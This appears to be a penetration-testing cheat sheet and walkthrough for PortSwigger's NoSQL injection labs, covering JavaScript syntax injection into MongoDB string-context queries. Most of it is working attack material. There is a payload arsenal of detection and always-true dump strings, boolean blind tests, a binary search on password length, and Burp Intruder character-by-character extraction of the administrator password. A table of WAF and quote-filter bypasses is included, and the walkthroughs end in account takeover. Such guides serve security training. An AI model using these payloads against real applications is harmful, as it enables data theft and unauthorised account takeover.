# NoSQL injection — Syntax injection (string context)

When user input is interpolated into a JS-evaluated MongoDB query string, injecting operators or boolean conditions breaks the query logic — exposing all records or enabling character-by-character blind data extraction.

## Quick reference
```
# Detection
'                                              -> syntax error = vulnerable
Gifts'+'                                       -> no error = string context confirmed (URL-encode!)

# Boolean bypass (filter/search)
Gifts'&&0&&'x                                  -> false → no products returned
Gifts'&&1&&'x                                  -> true → products returned
Gifts'||1||'                                   -> always-true → ALL records including hidden

# Blind extraction (lookup endpoint)
administrator'&&'1'=='1                        -> user found (true)
administrator'&&'1'=='2                        -> "Could not find user" (false)

# Password length
administrator'&&this.password.length<30||'a'=='b  -> true if pw < 30 chars
administrator'&&this.password.length<9||'a'=='b   -> false (pw >= 9)
administrator'&&this.password.length<8||'a'=='b   -> true → pw length = 8 (binary search)

# Char-by-char (Intruder cluster bomb)
administrator'&&this.password[§0§]=='§a§         -> pos1=0..7, pos2=a-z → longer resp = match
```

## Root cause
MongoDB's server-side JavaScript evaluation (`$where`, `mapReduce`, string-context queries) executes user-supplied input as JavaScript. When a query is built by string concatenation (e.g., `"db.find({category: '" + input + "'})"`) rather than parameterised queries, injected JS operators evaluate in the query context.

## Find it
1. Inject `'` into filter/search/lookup parameters → JS syntax error in response = vulnerable.
2. Inject `Gifts'+'` (URL-encoded) → no error = injection in string context.
3. Compare `Gifts'&&0&&'x` (false) vs `Gifts'&&1&&'x` (true) — different result counts confirm boolean control.
4. Confirm always-true dump: `Gifts'||1||'` → all records including hidden/unreleased appear.

## Technique

### Boolean bypass (search/filter)
1. Intercept the category filter request (e.g., `GET /filter?category=Gifts`).
2. Inject `'` → syntax error confirms injection.
3. Submit `Gifts'||1||'` (URL-encode: `Gifts%27%7c%7c1%7c%7c%27`) → all products returned.

### Blind data extraction (lookup endpoint)
1. Find a lookup endpoint: `GET /user/lookup?user=wiener`.
2. Inject `'` → error. Inject `wiener'+'` → no error (injection confirmed).
3. Test booleans:
   - True: `wiener'&&'1'=='1` → account details returned.
   - False: `wiener'&&'1'=='2` → "Could not find user".
4. Find password length (binary search on `this.password.length<N`):
   - `administrator'&&this.password.length<30||'a'=='b` → true
   - Narrow down until `<9` true, `<8` false → length = 8.
5. Extract each character via Intruder cluster bomb:
   - Parameter: `administrator'&&this.password[§0§]=='§a§`
   - Pos 1: numbers 0–7 (indices)
   - Pos 2: a–z (and A–Z, 0–9 if needed)
   - True condition = longer/different response → note the matching char per index.
6. Assemble password → log in as administrator.

## Payload arsenal
```
# URL-encode all payloads before sending (Ctrl-U in Burp)

# Detection
'
Gifts'+'

# Always-true dump
Gifts'||1||'

# Boolean false/true
Gifts'&&0&&'x
Gifts'&&1&&'x

# Blind true/false
administrator'&&'1'=='1
administrator'&&'1'=='2

# Length check (binary search)
administrator'&&this.password.length<30||'a'=='b
administrator'&&this.password.length<9||'a'=='b
administrator'&&this.password.length<8||'a'=='b

# Char extraction (Intruder cluster bomb)
administrator'&&this.password[§0§]=='§a§
# pos1: 0 to (length-1)   pos2: a-z (+ A-Z + 0-9)
```

## Bypasses
| Defense | Bypass |
|---|---|
| Quote filtering on `'` | Use `"` if double-quote context; try `\` escape |
| WAF blocks `&&` | URL double-encode: `%2526%2526` or use `%26%26` |
| Length > 9 (longer passwords) | Expand pos1 range in Intruder; use binary search on length first |

## Exploitation walkthrough

**Lab 1 (Detecting NoSQL injection):**
1. Click a product category filter → intercept `GET /filter?category=Gifts`.
2. Send to Repeater → inject `'` → syntax error.
3. Inject `Gifts'+'` (URL-encoded) → no error.
4. Inject `Gifts'||1||'` → all products including unreleased → lab solved.

**Lab 2 (Exploiting to extract data):**
1. Log in as wiener → intercept `GET /user/lookup?user=wiener`.
2. `'` → error; `wiener'+'` → no error.
3. Boolean true: `wiener'&&'1'=='1` returns data; false: `wiener'&&'1'=='2` returns "Could not find user".
4. Binary search password length: test `administrator'&&this.password.length<N||'a'=='b` → length = 8.
5. Cluster bomb: `administrator'&&this.password[§0§]=='§a§`, pos1=0-7, pos2=a-z.
6. Sort by response length — Account details response = char matched.
7. Assemble 8-char password → log in as administrator → lab solved.

## Chaining
- Boolean dump → expose hidden products / records.
- Blind extraction → administrator password → full account takeover → [Access-control](../../Access-control/).

## Tools
- **Burp Repeater** — boolean confirmation
- **Burp Intruder (Cluster bomb)** — char-by-char extraction; sort results by length to spot true conditions
- **Ctrl-U** in Burp to URL-encode payloads

## Labs

### Detecting NoSQL injection [Apprentice]
Category filter param vulnerable to JS injection. `'` = syntax error. `Gifts'||1||'` bypasses filter → all products including unreleased. Key insight: always-true boolean overrides the WHERE clause.

### Exploiting NoSQL injection to extract data [Practitioner]
`/user/lookup?user=` vulnerable. Boolean blind: true/false responses differ. Binary search password length = 8. Cluster bomb char extraction (pos1=0-7, pos2=a-z). Log in as admin. Key insight: `this.password[i]` enables char-by-char blind extraction of any field value.

## Real-world notes
- String-context NoSQL injection is common in MongoDB + Node.js stacks where input lands in `$where` or `eval`.
- Boolean-based blind is reliable because MongoDB typically returns data vs. empty/error on true vs. false.
- Always try `||1||` on search fields — unreleased/admin records appearing is an instant finding.

## References
- https://portswigger.net/web-security/nosql-injection
